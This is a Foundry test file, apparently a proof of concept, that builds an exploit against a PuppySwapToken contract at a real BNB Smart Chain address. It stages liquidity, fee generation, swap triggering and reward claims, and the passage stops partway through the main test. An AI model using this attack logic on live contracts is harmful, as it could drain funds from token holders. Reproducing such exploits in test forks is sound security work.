contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xeFfAb18108124C2b6280C62abA70a03c79cc4327;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Binance Smart Chain mainnet PancakeSwap router

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Label addresses for clarity
        vm.label(TARGET, "PuppySwapToken");
        vm.label(address(this), "Attacker");

        // Get the owner address from the contract
        PuppySwapToken puppy = PuppySwapToken(TARGET);
        address owner = puppy.owner();
        vm.label(owner, "Owner");

        // Get pancake pair address
        address pancakePair = puppy.pancakePair();
        vm.label(pancakePair, "PancakePair");

        // Impersonate owner to activate contract
        vm.startPrank(owner);
        puppy.activateContract();
        vm.stopPrank();

        // Give attacker some initial PUPPY tokens to work with
        // Get some from owner by impersonating
        vm.startPrank(owner);
        // Transfer some tokens to attacker (owner is excluded from fees)
        uint256 initialTokens = puppy.balanceOf(owner) / 100; // 1% of owner's balance
        puppy.transfer(address(this), initialTokens);
        vm.stopPrank();

        // Give attacker some BNB for gas and potential transfers
        deal(address(this), 10 ether);

        // Also need to give contract some BNB for the swap to work
        // The contract needs BNB balance for the swap to receive BNB
        deal(TARGET, 5 ether);
    }

    // ─── Helper Functions ────────────────────────────────────
    function _addLiquidity() internal {
        PuppySwapToken puppy = PuppySwapToken(TARGET);
        address pancakeRouter = puppy.pancakeRouter();

        // Get some tokens for liquidity provision
        vm.startPrank(puppy.owner());
        uint256 ownerBalance = puppy.balanceOf(puppy.owner());
        uint256 liquidityTokens = ownerBalance / 100; // 1% for liquidity
        puppy.transfer(address(this), liquidityTokens);
        vm.stopPrank();

        // Approve router to spend attacker's tokens
        puppy.approve(pancakeRouter, type(uint256).max);

        // Add liquidity: need both tokens and BNB
        uint256 bnbForLiquidity = 1 ether;

        // Use PancakeRouter to add liquidity
        IPancakeRouter02 router = IPancakeRouter02(pancakeRouter);
        router.addLiquidityETH{value: bnbForLiquidity}(
            TARGET,
            liquidityTokens / 2, // Use half for initial liquidity
            0,
            0,
            address(this),
            block.timestamp + 3600
        );
    }

    function _generateFees() internal {
        PuppySwapToken puppy = PuppySwapToken(TARGET);
        uint256 attackerBalance = puppy.balanceOf(address(this));

        // Create multiple dummy addresses for transfers
        for (uint i = 0; i < 20; i++) {
            address dummy = address(uint160(0x1000 + i));

            // Transfer small amount to incur fees
            uint256 transferAmount = attackerBalance / 100; // 1%

            // Skip if amount is too small
            if (transferAmount < 1000) break;

            puppy.transfer(dummy, transferAmount);

            // Update attacker balance (approximate after fees)
            attackerBalance = attackerBalance * 90 / 100;
        }
    }

    function _triggerSwapAndLiquify() internal {
        PuppySwapToken puppy = PuppySwapToken(TARGET);
        address recipient = address(0x456);
        uint256 triggerAmount = 1000; // Small amount just to trigger

        puppy.transfer(recipient, triggerAmount);
    }

    function _claimRewards(address claimer) internal returns (uint256) {
        PuppySwapToken puppy = PuppySwapToken(TARGET);

        // Check if claimer has a next claim date
        uint256 nextClaim = puppy.nextAvailableClaimDate(claimer);

        // If we need to wait, warp time
        if (nextClaim > block.timestamp) {
            vm.warp(nextClaim);
        }

        // Record claimer's BNB balance before claim
        uint256 claimerBalanceBefore = claimer.balance;

        // Claim BNB reward from claimer address
        vm.prank(claimer);
        puppy.claimBNBReward();

        // Return the claimed amount
        return claimer.balance - claimerBalanceBefore;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        PuppySwapToken puppy = PuppySwapToken(TARGET);
        address pancakeRouter = puppy.pancakeRouter();
        vm.label(pancakeRouter, "PancakeRouter");

        // Record initial BNB balance of attacker
        uint256 initialAttackerBalance = address(this).balance;

        // Create an EOA address for claiming rewards
        address claimer = address(0x123456789ABCDEF);
        vm.label(claimer, "ClaimerEOA");

        // First, we need to add initial liquidity to the pair
        console.log("Adding initial liquidity to pair...");
        _addLiquidity();

        console.log("Initial liquidity added");

        // Also give some tokens to claimer
        puppy.transfer(claimer, puppy.balanceOf(address(this)) / 20);

        // Now build up contract's token balance from fees
        // Check current contract balance
        uint256 contractTokenBalance = puppy.balanceOf(TARGET);
        // minTokenNumberToSell = 10**24 * 1 / 10000 / 10 = 10**19
